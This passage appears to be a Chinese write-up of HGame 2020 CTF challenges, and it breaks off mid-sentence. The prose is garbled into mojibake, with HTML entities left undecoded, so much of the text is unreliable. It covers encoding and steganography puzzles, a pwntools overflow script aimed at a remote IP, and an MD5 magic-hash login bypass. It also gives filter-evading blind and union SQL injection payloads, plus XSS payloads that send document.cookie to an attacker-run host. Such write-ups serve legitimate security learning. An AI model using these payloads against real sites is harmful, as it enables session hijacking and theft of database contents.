é€’äº†ä¸€ä¸ªå‚æ•°ï¼Œç”¨|åˆ†å‰²ï¼Œå‰é¢çŒœæµ‹æ˜¯åˆ†æ•°ï¼Œåé¢æ˜¯Unixæ—¶é—´æˆ³çš„MD5åŠ å¯†çš„å€¼ï¼Œä¸è¿‡å¥½åƒæ²¡å•¥ç”¨ï¼Œè¿™é‡Œæœ‰ä¸ªç½‘ç«™https://tool.lu/timestamp/ ç›´æ¥æ”¹å‰é¢çš„æ•°å°±è¡Œ miscæ¬¢è¿å‚åŠ HGameï¼æ˜¯ä¸€ä¸²å­—ç¬¦Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0tï¼Œbase64è§£å¯†å‘ç°æ˜¯æ‘©æ–¯å¯†ç ï¼Œå†è§£å¯†å¾—W3LC0MEnullTOnull2020nullHGAM3ï¼Œå°†nullæ›¿æ¢æˆ_å¹¶åŠ ä¸Šhgame{}å¾—flag å£çº¸é¢˜ç›®æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œbinwalkåˆ†ç¦»å‡ºå‹ç¼©åŒ…ï¼ŒstringsæŸ¥çœ‹å¯æ˜¾ç¤ºå­—ç¬¦ï¼Œå‘ç°Password is picture ID.ï¼Œè¿™ä¸ªå›¾ç‰‡æ˜¯Pç«™ä¸Šçš„å›¾ç‰‡ï¼Œæœä¸€ä¸‹å›¾ç‰‡åå­—ï¼Œæ‰¾äº†æ‰¾å‘ç°ä¹Ÿä¸å¯¹ï¼Œçˆ†ç ´ä¸€ä¸‹å§ï¼Œå‘ç°idæ˜¯8ä½æ•°å­— æˆåŠŸçˆ†ç ´å‡ºæ¥ï¼Œè§£å‹å‘ç°æ˜¯Unicodeç¼–ç ï¼Œè§£ç å¾—flag å…‹è‹é²ç¥è¯è§£å‹é¢˜ç›®ç»™çš„å‹ç¼©åŒ…ï¼Œå‘ç°Bacon.txtå’ŒNovel.zipä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”Novel.zipæœ‰å’ŒBacon.txtä¸€æ ·çš„æ–‡ä»¶ çŒœæµ‹æ˜¯æ˜æ–‡æ”»å‡»ï¼Œæç¤ºç”¨7-zipï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨7-zipå°†Bacon.txtå‹ç¼©ä½œä¸ºæ˜æ–‡ ç›´æ¥åœæ­¢å°±è¡Œï¼Œè™½ç„¶æ²¡æ‰¾åˆ°å¯†ç ï¼Œä½†å·²æˆåŠŸè§£å‹å‡ºæ¥äº† è§£å‹ä¸¤ä¸ªæ–‡ä»¶ï¼ŒBacon.txtå’ŒThe Call of Cthulhu.docæ‰“å¼€docæ–‡ä»¶å‘ç°è¦å¯†ç ï¼Œtxtæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 123of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.*Password in capital letters. å¤§å°å†™å­—æ¯äº¤å‰ï¼Œæ˜¾ç„¶æ˜¯åŸ¹æ ¹å¯†ç (äº”ä¸ªä¸€ä½ï¼Œå°å†™å­—æ¯è¡¨ç¤ºå¤§å†™å­—æ¯å¾—åŠ å¯†ç»“æœï¼Œåä¹‹ä¹Ÿæˆç«‹)ï¼Œæ›¿æ¢æˆå°å†™å¾—aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba è§£å¯†å¾—FLAGHIDDENINDOCï¼Œè¾“å…¥å¯†ç æ‰“å¼€ï¼Œæ˜¾ç¤ºéšè—æ–‡å­—ï¼Œå¾—åˆ°flag ç­¾åˆ°é¢˜ProPlusæ‰“å¼€å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…OK.zipï¼Œä¸€ä¸ªpassword.txt æ–‡æœ¬æ–‡ä»¶é‡Œè®°å½•ï¼š 123456Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fenses first, Five Caesar next. English sentense first, zip password next. å¤§æ¦‚æ„æ€æ˜¯å…ˆç»è¿‡äº†ä¸‰å±‚æ …æ å¯†ç ï¼Œåç»è¿‡5å±‚å‡¯æ’’å¯†ç ï¼Œè‹±è¯­å¥å­åœ¨å‰ï¼Œå‹ç¼©åŒ…å¯†ç åœ¨å æ …æ å¯†ç åœ¨çº¿è§£å¯†ï¼šhttps://www.qqxiuzi.cn/bianma/zhalanmima.php å‡¯æ’’å¯†ç åœ¨çº¿è§£å¯†ï¼šhttps://www.qqxiuzi.cn/bianma/kaisamima.php è§£å¯†ç»“æœï¼š 123Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.EAVMUBAQHQMVEPDT ç¬¬äºŒä¸ªå°±æ˜¯å‹ç¼©åŒ…å¯†ç ï¼Œè§£å¯†ä¹‹åå¾—åˆ°Ook!åŠ å¯†ï¼Œå¯†æ–‡è§£å¯†å¾—base32çš„å¯†æ–‡ï¼Œå»æ‰data:text;base32,ï¼Œå†è§£å¯†å¾—base64çš„å¯†æ–‡ æœ€åbase64è½¬å›¾ç‰‡ï¼ŒåŠ ä¸Šdata:image/png;base64,ï¼Œå¾—äºŒç»´ç ï¼Œæ‰«ç å¾—flag Ook!è§£å¯†åœ°å€ï¼šhttps://tool.bugku.com/brainfuck/[](https://tool.bugku.com/brainfuck/) base64è½¬å›¾ç‰‡åœ°å€ï¼šhttp://tool.chinaz.com/tools/imgtobase æ¯æ—¥æ¨èæ‰“å¼€å‘ç°æ˜¯ä¸ªæµé‡åŒ…ï¼Œå¯¼å‡ºHTTPå¯¹è±¡ï¼Œå‘ç°æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æ–‡ä»¶ å°†å…¶ä¿å­˜ï¼Œbinwalkåˆ†ç¦»å‡ºä¸€ä¸ªåŠ å¯†å¾—å‹ç¼©åŒ…ï¼ŒæŸ¥çœ‹å±æ€§æ—¶å‘ç° ARCHPRç ´è§£å‡ºå¯†ç ä¸º759371ï¼Œè§£å‹å¾—åˆ°I Love Mondays.mp3 æŸ¥çœ‹é¢‘è°±å›¾å¾—åˆ°flag pwnHard_AAAAAidaåç¼–è¯‘ä»£ç  så’Œv5ç›¸å·®123ï¼Œæ‰€ä»¥ï¼š 1234567from pwn import*import timecontext.log_level = &#x27;debug&#x27;cn=remote(&#x27;47.103.214.163&#x27;,20000)cn.sendline(&#x27;a&#x27;*123+&#x27;0O0o\\0O0&#x27;)cn.interactive() Week2webCosmosçš„åšå®¢åå°æ‰“å¼€å‘ç°è·³è½¬åˆ°?action=login.phpï¼Œæƒ³åˆ°äº†æ–‡ä»¶åŒ…å«ï¼Œphp://filterè¯»æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpinclude &quot;config.php&quot;;session_start();&#x2F;&#x2F;Only for debugif (DEBUG_MODE)&#123; if(isset($_GET[&#39;debug&#39;])) &#123; $debug &#x3D; $_GET[&#39;debug&#39;]; if (!preg_match(&quot;&#x2F;^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$&#x2F;&quot;, $debug)) &#123; die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$debug);&quot;); &#125;&#125;if(isset($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: admin.php&quot;); exit();&#125;else &#123; if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123; if ($admin_password &#x3D;&#x3D; md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; $admin_username)&#123; $_SESSION[&#39;username&#39;] &#x3D; $_POST[&#39;username&#39;]; header(&quot;Location: admin.php&quot;); exit(); &#125; else &#123; echo &quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;; &#125; &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt; &lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;&quot;&gt; &lt;title&gt;Cosmosçš„åšå®¢åå°&lt;&#x2F;title&gt; &lt;link href&#x3D;&quot;static&#x2F;signin.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt; &lt;link href&#x3D;&quot;static&#x2F;sticky-footer.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt; &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div class&#x3D;&quot;container&quot;&gt; &lt;form class&#x3D;&quot;form-signin&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;login.php&quot;&gt; &lt;h2 class&#x3D;&quot;form-signin-heading&quot;&gt;åå°ç™»é™†&lt;&#x2F;h2&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;ç”¨æˆ·å&quot; required autofocus&gt; &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;å¯†ç &quot; required&gt; &lt;input class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;footer class&#x3D;&quot;footer&quot;&gt; &lt;center&gt; &lt;div class&#x3D;&quot;container&quot;&gt; &lt;p class&#x3D;&quot;text-muted&quot;&gt;Created by Annevi&lt;&#x2F;p&gt; &lt;&#x2F;div&gt; &lt;&#x2F;center&gt;&lt;&#x2F;footer&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; æŸ¥çœ‹æºç ï¼Œå‘ç°å¯ä»¥ç”¨å¯å˜å˜é‡æŸ¥çœ‹usernameï¼Œè€Œpasswordçš„MD5åˆæ˜¯0eå¼€å¤´ 1login.php?debug&#x3D;admin_username &#x2F;&#x2F;è¯»å–ç”¨æˆ·å ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥ç™»é™†äº† 1POST: username&#x3D;Cosmos!&amp;password&#x3D;QNKCDZO å†æŒ‰ä¹‹å‰çš„æ–¹å¼è¯»ä¸‹admin.phpæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpinclude &quot;config.php&quot;;session_start();if(!isset($_SESSION[&#39;username&#39;])) &#123; header(&#39;Location: index.php&#39;); exit();&#125;function insert_img() &#123; if (isset($_POST[&#39;img_url&#39;])) &#123; $img_url &#x3D; @$_POST[&#39;img_url&#39;]; $url_array &#x3D; parse_url($img_url); if (@$url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;timgsa.baidu.com&quot;) &#123; return false; &#125; $c &#x3D; curl_init(); curl_setopt($c, CURLOPT_URL, $img_url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $res &#x3D; curl_exec($c); curl_close($c); $avatar &#x3D; base64_encode($res); if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123; return $avatar; &#125; &#125; else &#123; return base64_encode(file_get_contents(&quot;static&#x2F;logo.png&quot;)); &#125;&#125;?&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Cosmos&#39;Blog - åå°ç®¡ç†&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;a href&#x3D;&quot;logout.php&quot;&gt;é€€å‡ºç™»é™†&lt;&#x2F;a&gt; &lt;div style&#x3D;&quot;text-align: center;&quot;&gt; &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt; &lt;legend&gt;æ’å…¥å›¾ç‰‡&lt;&#x2F;legend&gt; &lt;p&gt;&lt;label&gt;å›¾ç‰‡url: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;img_url&quot; placeholder&#x3D;&quot;&quot;&gt;&lt;&#x2F;label&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;button type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&gt;æ’å…¥&lt;&#x2F;button&gt;&lt;&#x2F;p&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;form&gt; &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt; &lt;legend&gt;è¯„è®ºç®¡ç†&lt;&#x2F;legend&gt; &lt;h2&gt;å¾…å¼€å‘..&lt;&#x2F;h2&gt; &lt;&#x2F;fieldset&gt; &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;&quot;&gt; &lt;legend&gt;æ–‡ç« åˆ—è¡¨&lt;&#x2F;legend&gt; &lt;h2&gt;å¾…å¼€å‘..&lt;&#x2F;h2&gt; &lt;&#x2F;fieldset&gt; &lt;fieldset style&#x3D;&quot;height: 50%&quot;&gt; &lt;div style&#x3D;&quot;text-align: center;&quot;&gt; &lt;img height&#x3D;&#39;200&#39; width&#x3D;&#39;500&#39; src&#x3D;&#39;data:image&#x2F;jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static&#x2F;error.jpg&quot;)); ?&gt;&#39;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å¯ä»¥æŒ‰ç…§ä¸‹é¢payloadæ„é€ ï¼š è§£ç å³å¯å¾—flag Cosmosçš„ç•™è¨€æ¿-1é¢˜ç›®æ˜¯å¯ä»¥sqlæ—¶é—´ç›²æ³¨ï¼Œåæ¥çœ‹å®˜æ–¹wpè”åˆæŸ¥è¯¢å°±è¡Œï¼Œé¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œè€Œä¸”å°†selectæ›¿æ¢æˆç©º è´´ä¸€ä¸‹æˆ‘è„šæœ¬çš„payloadå§ï¼š 1234567891011payload1 = &#x27;/**/and/**/if(length(database())=&#123;&#125;,sleep(3),1)%23&#x27;.format(i) #çˆ†å½“å‰æ•°æ®åº“é•¿åº¦payload2 = &#x27;/**/and/**/if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(j, k) #çˆ†å½“å‰æ•°æ®åº“payload3=&#x27;/**/and/**/if(ascii(substr((selselectect/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(k , i, j) #çˆ†æ‰€æœ‰æ•°æ®åº“ï¼Œæ³¨æ„limité‚£é‡Œæ˜¯ä»0å¼€å§‹payload4=&#x27;/**/and/**/if(ascii(substr((selselectect/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(k , i, j) #çˆ†è¡¨payload5=&#x27;/**/and/**/if(ascii(substr((seselectlect/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&quot;&#123;&#125;&quot; limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(te,k,i,j) #çˆ†å­—æ®µpayload6=&#x27;/**/and/**/if(ascii(substring((seselectlect/**/&#123;&#125;/**/from/**/&#123;&#125;.&#123;&#125;/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(co,db,ta,k,i,j) #çˆ†å†…å®¹ è”åˆæŸ¥è¯¢çš„payload: 1234567891011121314&#x27;/*1*/union/*1*/selselectect/*1*/database();##å¾—åˆ°æ•°æ®åº“ä¸ºeasysql&#x27;/*1*/union/*1*/selselectect/*1*/group_concat(table_name)/*1*/from/*1*/information_schema.tables/*1*/where/*1*/table_schema=&#x27;easysql&#x27;;##å¾—åˆ°æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨å å‘ç°å­˜æ”¾flagçš„è¡¨åä¸ºf1aggggggggggggg&#x27;/*1*/union/*1*/selselectect/*1*/group_concat(column_name)/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name=&#x27;f1aggggggggggggg&#x27;/*1*/and/*1*/table_schema=&#x27;easysql&#x27;;# #å¾—åˆ°flagçš„å­—æ®µåä¸ºfl4444444g&#x27;/*1*/union/*1*/selselectect/*1*/fl4444444g/*1*/from/*1*/f1aggggggggggggg;##å¾—åˆ°flag Cosmosçš„æ–°è¯­è¨€è¿™é¢˜æ²¡ä»€è«éš¾åº¦ï¼Œå†™è„šæœ¬å°±è¡Œï¼Œä¸è¿‡æˆ‘çš„è„šæœ¬æ˜¯çœŸçš„çƒ‚ï¼Œå‹¿å–·ï¼2333â€¦. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import requestsimport reimport base64def dnc(tr): f=&#x27;&#x27; for i in tr: f+=chr(ord(i)-1) return fdef rec(tr): return tr[::-1]def rot13(s, OffSet=13): def encodeCh(ch): f=lambda x: chr((ord(ch)-x+OffSet) % 26 + x) return f(97) if ch.islower() else (f(65) if ch.isupper() else ch) return &#x27;&#x27;.join(encodeCh(c) for c in s)def b64(tr): return str(base64.b64decode(tr.encode()).decode()) # return requests.get(&quot;http://127.0.0.1/base64.php?a=&quot;+tr).textdef met(tr): s=requests.get(&#x27;http://1c75f1a924.php.hgame.n3ko.co/mycode&#x27;) li=re.findall(r&#x27;echo\\(.*\\)&#x27;,s.text)[0] mets=[] m=[&#x27;str_rot13&#x27;,&#x27;base64_encode&#x27;,&#x27;encrypt&#x27;,&#x27;strrev&#x27;] for l in li.split(&#x27;(&#x27;): if l in m: mets.append(l) mets.reverse() de=&quot;&quot; for j in mets: if j==&quot;base64_encode&quot;: de+=&#x27;b64(&#x27; elif j==&quot;str_rot13&quot;: de+=&quot;rot13(&quot; elif j==&quot;strrev&quot;: de+=&quot;rec(&quot; elif j==&quot;encrypt&quot;: de+=&quot;dnc(&quot; de+=&quot;&#x27;&quot;+tr+&quot;&#x27;&quot; de+=de.count(&quot;(&quot;)*&quot;)&quot; print(de) return eval(de)url=&#x27;http://1c75f1a924.php.hgame.n3ko.co/&#x27;q=requests.session()r=q.get(url)r.encoding=&quot;utf-8&quot;tr=str(re.findall(r&#x27;&lt;br&gt;\\n(.*)&lt;br&gt;&#x27;,r.text)[-1])data=&#123;&quot;token&quot;:met(tr)&#125;# print(data)r=q.post(url,data=data)print(r.text) Cosmosçš„èŠå¤©å®¤æœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯xss ç»è¿‡æµ‹è¯•ï¼Œå‘ç°scriptæ ‡ç­¾è¿‡æ»¤ï¼Œ&lt;&gt;æœ‰å•åŒå¼•å·é—­åˆä¼šæ›¿æ¢æˆç©ºï¼Œå‘ç°imgæ ‡ç­¾å¯ç”¨ æœ€ç»ˆæ„é€ å‡ºæ¥ï¼š 1&lt;img src=&quot;&quot; onerror=&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#46;&amp;#109;&amp;#111;&amp;#111;&amp;#110;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#46;&amp;#120;&amp;#121;&amp;#122;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&quot;# å®ä½“ç¼–ç ä»£è¡¨çš„æ„æ€æ˜¯ 1document.location=&#x27;http://xss.moonback.xyz/?&#x27;+document.cookie é€šè¿‡æ—¥å¿—å°±å¯çœ‹åˆ°tokenäº†ï¼Œæœ€å å¦å¤–ä¸€ä¸ªpayload 1&lt;img src=&quot;&quot; onerror=&quot;&amp;#x73;&amp;#x3d;&amp;#x6e;&amp;#x65;&amp;#x77;&amp;#x20;&amp;#x49;&amp;#x6d;&amp;#x61;&amp;#x67;&amp;#x65;&amp;#x28;&amp;#x29;&amp;#x3b;&amp;#x73;&amp;#x2e;&amp;#x73;&amp;#x72;&amp;#x63;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2e;&amp;#x6d;&amp;#x6f;&amp;#x6f;&amp;#x6e;&amp;#x62;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x2e;&amp;#x78;&amp;#x79;&amp;#x7a;&amp;#x2f;&amp;#x3f;&amp;#x27;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot; å®ä½“ç¼–ç æ„æ€ 1s=new Image();s.src=&#x27;http://xss.moonback.xyz/?&#x27;+document.cookie; å®˜æ–¹çš„writeup: 123&lt;svg/onload=&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 ç¼–ç å†…çš„å†…å®¹æ˜¯ window.open(&#39;http://vps-ip&#39;+document.cookie);// miscCosmosçš„åˆé¤æ‰“å¼€ä¸¤ä¸ªæ–‡ä»¶ï¼ŒCapture.pcapngå’Œssl_log.log wiresharkæ‰“å¼€æµé‡åŒ…ï¼Œå°†sslå¯¼å…¥è¿›å» å…·ä½“æ“ä½œï¼šç¼–è¾‘-&gt;é¦–é€‰é¡¹-&gt;Protocols-&gt;TLS æˆåŠŸå¯¼å…¥ï¼Œå¯¼å‡ºHTTPå¯¹è±¡å‘ç°ï¼Œæœ‰ä¸ªæ–‡ä»¶ç‰¹åˆ«å¤§ å¯¼å‡ºå‘ç°æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—Outguess with key.jpg ç”±è¿™ä¸ªæ–‡ä»¶åå­—çŒœæµ‹ç”¨Outguesséšå†™çš„ï¼Œåœ°å€ï¼šhttps://github.com/crorvick/outguess 123sudo apt-get install outguess #å®‰è£…outguess -k password -d hinden.txt demo.jpg out.jpg #åŠ å¯†outguess -k password -r out.jpg hidden.txt #è§£å¯† æŸ¥çœ‹æ–‡ä»¶å±æ€§æœç„¶æ‰¾åˆ°å¯†ç  è§£å¯†å‡ºæ¥æ˜¯ä¸ªurlï¼ˆhttps://dwz.cn/69rOREduï¼‰ï¼Œè®¿é—®å‡ºé”™ï¼Œç”¨curlæŸ¥çœ‹ è®¿é—®æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾—flag æ‰€è§å³ä¸ºå‡é¢˜ç›®æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œ16è¿›åˆ¶æŸ¥çœ‹ï¼Œå‘ç°æ˜¯zipä¼ªåŠ å¯†ï¼Œå³æ ‡å¿—ä½ä¸º14 00 09 00 å¯ä»¥æ‰‹åŠ¨å°†å…¶æ”¹ä¸º14 00 00 00ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨winraræ¢å¤ æˆåŠŸè§£å‹åå‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œç”¨stringsæŸ¥çœ‹å‘ç°æœ€åæœ‰F5 key æœäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°å¯¹åº”çš„å·¥å…·ï¼šhttps://github.com/matthewgao/F5-steganography 12java Extract 123456.jpg -p 123456 -e a.txt #éšå†™è§£å¯†è¾“å‡ºåˆ°a.txt,ä¸åŠ -eä¼šç›´æ¥è¾“å‡ºoutput.txtjava Embed -e 1.txt -p 123456 1.jpg 2.jpg #å°†1.txtå†…å®¹éšå†™åˆ°1.jpgè¾“å‡ºä¸º2.jpgï¼Œå¯†ç ä¸º123456 åœ¨output.txtå¾—åˆ°ä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè½¬Asciiå­—ç¬¦å³å¯å¾—åˆ°flag åœ°çƒä¸Šæœ€åçš„å¤œæ™šé¢˜ç›®è§£å‹ä¸¤ä¸ªæ–‡ä»¶ï¼ŒNo password.pdfå’ŒåŠ å¯†çš„Last Evenings on Earth.7z é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯pdféšå†™ï¼Œå·¥å…·åœ°å€ï¼šhttp://wbstego.wbailer.com ç›´æ¥ç”¨å·¥å…·ï¼Œå¯†ç è®¾ç½®ä¸ºç©ºï¼Œè·å–éšå†™å†…å®¹å¾—åˆ° 1Zip Password: OmR#O12#b3b%s*IW è§£å‹å‹ç¼©åŒ…ï¼Œå‘ç°æ˜¯Last Evenings on Earth.docxï¼Œbinwalkåˆ†ç¦»ï¼Œåœ¨word/secret.xmlé‡Œæ‰¾åˆ°flag ç©ç©æ¡ç â¾¸å…ˆè§£å‹é™„ä»¶ï¼Œå¾—åˆ°7zipPasswordHere.mp4ã€Code128.7zå’ŒJPNPostCode.png å…ˆçœ‹ä¸‹è¿™ä¸ªJPNPostCode.pngï¼Œé€šè¿‡æ–‡ä»¶åå¯çŸ¥ä¸æ—¥æœ¬é‚®æ”¿æ¡ç ç›¸å…³ ç¼–ç è§„åˆ™å‚è€ƒèµ„æ–™ï¼šhttp://help.seagullscientifific.com/2016/en/Subsystems/Symbology/Content/Japanese_Postal.htm å¯çœ‹å‡ºï¼Œè¯¥æ¡ç ç”±å››ç§ä¸åŒçš„æ ·å¼ç»„æˆï¼ˆâ»“æ¡ï¼Œä¸Šâ½…åŠâ»“æ¡ï¼Œä¸‹â½…åŠâ»“æ¡ï¼ŒçŸ­æ¡ï¼Œåˆ†åˆ«â½¤1ã€2ã€3ã€4è¡¨ ç¤ºï¼‰ã€‚æ¡ç ç”±å¼€å§‹æ ‡å¿—ï¼ˆ1 3ï¼‰ã€æ•°å­—éƒ¨åˆ†ï¼ˆæ¯ä¸ªæ•°å­—ç”±ä¸‰ä¸ªâ€œæ¡â€ç»„æˆï¼‰ã€å­—âºŸéƒ¨åˆ†ï¼ˆè‹¥â½†å­—âºŸåˆ™ä½¿â½¤å¡« å……ç¬¦å·ï¼Œå¡«å……ç¬¦å·ä¸º4 2 3ï¼‰ã€æ ¡éªŒä½å’Œç»“æŸæ ‡å¿—ç»„æˆ å†ç»“åˆå†…å®¹ä¸ºâ€œ0123456789â€çš„æ¡ç  (åœ¨çº¿â½£æˆï¼šhttps://barcode.tec-it.com/zh/JapanesePostal?data= 0123456789)ï¼š å¯ä»¥å¾—åˆ°æ•°å­—åŒºåŸŸå¯¹åº”çš„æ¡ç ç¼–ç è§„å¾‹ï¼š 0ï¼š1 4 4 1ï¼š1 1 4 2ï¼š1 3 2 3ï¼š3 1 2 4ï¼š1 2 3 5ï¼š1 4 1 6ï¼š3 2 1 7ï¼š2 1 3 8ï¼š2 3 1 9ï¼š4 1 1 éšåæŒ‰ç…§è¿™â¼€è§„å¾‹â½å¯¹é™„ä»¶ä¸­ç»™å‡ºçš„æ¡ç ï¼Œå¯ä»¥è§£å‡ºæ¡ç å†…å®¹ä¸º1087627ï¼ˆç”±äºå­—âºŸåŒºåŸŸå‡ä¸ºå¡«å……ç¬¦ å·ï¼Œå› æ­¤å¯ä»¥åˆ¤æ–­å‡ºæ²¡æœ‰ä¿¡æ¯å­˜åœ¨ï¼‰ å†çœ‹ä¸‹7zipPasswordHere.mp4ï¼Œé¢˜ç›®ç»™äº†ä¸¤ä¸ªé“¾æ¥ï¼š 